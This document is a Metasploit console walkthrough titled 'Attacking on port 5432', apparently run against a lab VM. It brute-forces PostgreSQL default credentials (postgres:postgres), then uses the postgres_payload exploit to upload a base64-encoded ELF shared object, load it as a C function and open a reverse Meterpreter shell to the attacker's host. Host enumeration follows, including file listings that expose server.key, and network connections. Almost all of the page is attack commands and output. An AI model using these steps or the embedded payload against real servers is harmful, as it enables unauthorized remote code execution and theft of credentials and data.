# Attacking on port 5432

```
msf > search postgresql
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                       Disclosure Date  Rank       Description
   ----                                                       ---------------  ----       -----------
   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   exploit/multi/postgres/postgres_createlang                 2016-01-01       good       PostgreSQL CREATE LANGUAGE Execution
   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
   post/linux/gather/enum_users_history                                        normal     Linux Gather User History


msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                               Required  Description
   ----              ---------------                                                               --------  -----------
   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                     yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
   PASSWORD                                                                                        no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
   RHOSTS                                                                                          yes       The target address range or CIDR identifier
   RPORT             5432                                                                          yes       The target port
   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                                                             yes       The number of concurrent threads
   USERNAME                                                                                        no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                          yes       Whether to print output for all attempts

msf auxiliary(postgres_login) > set BRUTEFORCE_SPEED 10
BRUTEFORCE_SPEED => 10
msf auxiliary(postgres_login) > set RHOSTs 192.168.56.101
RHOSTs => 192.168.56.101
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(postgres_login) > set VERBOSE true
VERBOSE => true
msf auxiliary(postgres_login) > run

[*] Error: 192.168.56.101: Metasploit::Framework::LoginScanner::Invalid Bruteforce speed must be less than or equal to 5 (Metasploit::Framework::LoginScanner::Postgres)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(postgres_login) > set BRUTEFORCE_SPEED 5
BRUTEFORCE_SPEED => 5
msf auxiliary(postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[+] 192.168.56.101:5432 - Login Successful: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(postgres_login) > eploit
[-] Unknown command: eploit.
msf auxiliary(postgres_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[-] 192.168.56.101:5432 - 
[+] 192.168.56.101:5432 - Login Successful: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


use exploit/linux/pop3/cyrus_pop3d_popsubfolders  use exploit/linux/postgres/postgres_payload       
msf auxiliary(postgres_login) > use exploit/linux/postgres/postgres_payload
msf exploit(postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOST                      yes       The target address
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf exploit(postgres_payload) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(postgres_payload) > set VERBOSE true
VERBOSE => true
msf exploit(postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOST     192.168.56.101   yes       The target address
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   true             no        Enable verbose output


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf exploit(postgres_payload) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Trying postgres:postgres@192.168.56.101:5432/template1
[*] 192.168.56.101:5432 Postgres - querying with 'select version()'
[*] 192.168.56.101:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] 192.168.56.101:5432 Postgres - querying with 'select lo_creat(-1)'
[*] 192.168.56.101:5432 Postgres - querying with 'delete from pg_largeobject where loid=16384'
[*] 192.168.56.101:5432 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(16384, 0, decode('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', 'base64'))'
[*] 192.168.56.101:5432 Postgres - querying with 'select lo_export(16384, '/tmp/dxlTyZKn.so')'
[*] Uploaded as /tmp/dxlTyZKn.so, should be cleaned up automatically
[*] 192.168.56.101:5432 Postgres - querying with 'create or replace function pg_temp.vTewziqEgp() returns void as '/tmp/dxlTyZKn.so','vTewziqEgp' language c strict immutable'
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (826872 bytes) to 192.168.56.101
[*] 192.168.56.101:5432 Postgres - Disconnected
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:47398) at 2018-05-23 08:58:13 +0000
[+] negotiating tlv encryption

meterpreter > 
[+] negotiated tlv encryption
[+] negotiated tlv encryption
ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 16436
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : eth0
Hardware MAC : 08:00:27:f0:f2:f4
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.56.101
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a00:27ff:fef0:f2f4
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > pwd
/var/lib/postgresql/8.3/main
meterpreter > ls -la
Listing: /var/lib/postgresql/8.3/main
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  4     fil   2010-03-17 14:08:46 +0000  PG_VERSION
40700/rwx------   4096  dir   2010-03-17 14:08:56 +0000  base
40700/rwx------   4096  dir   2018-05-21 19:27:17 +0000  global
40700/rwx------   4096  dir   2010-03-17 14:08:49 +0000  pg_clog
40700/rwx------   4096  dir   2010-03-17 14:08:46 +0000  pg_multixact
40700/rwx------   4096  dir   2010-03-17 14:08:49 +0000  pg_subtrans
40700/rwx------   4096  dir   2010-03-17 14:08:46 +0000  pg_tblspc
40700/rwx------   4096  dir   2010-03-17 14:08:46 +0000  pg_twophase
40700/rwx------   4096  dir   2010-03-17 14:08:49 +0000  pg_xlog
100600/rw-------  125   fil   2018-05-21 07:05:59 +0000  postmaster.opts
100600/rw-------  54    fil   2018-05-21 07:05:59 +0000  postmaster.pid
100644/rw-r--r--  540   fil   2010-03-17 14:08:45 +0000  root.crt
100644/rw-r--r--  1224  fil   2010-03-17 14:07:45 +0000  server.crt
100640/rw-r-----  891   fil   2010-03-17 14:07:45 +0000  server.key

meterpreter > cd ..
meterpreter > ls -la
Listing: /var/lib/postgresql/8.3
================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40700/rwx------  4096  dir   2018-05-21 07:05:58 +0000  main

meterpreter > pwd
/var/lib/postgresql/8.3

meterpreter > bglist
meterpreter > netstat

Connection list
===============

    Proto  Local address         Remote address        State        User  Inode  PID/Program name
    -----  -------------         --------------        -----        ----  -----  ----------------
    tcp    0.0.0.0:512           0.0.0.0:*             LISTEN       0     0      
    tcp    0.0.0.0:513           0.0.0.0:*             LISTEN       0     0      
    tcp    0.0.0.0:2049          0.0.0.0:*             LISTEN       0     0      
    tcp    0.0.0.0:514           0.0.0.0:*             LISTEN       0     0      
    tcp    0.0.0.0:8009          0.0.0.0:*             LISTEN       110   0      
    tcp    0.0.0.0:6697          0.0.0.0:*             LISTEN       0     0      
    tcp    0.0.0.0:3306          0.0.0.0:*             LISTEN       109   0      
    tcp    0.0.0.0:1099          0.0.0.0:*             LISTEN       0     0      


```



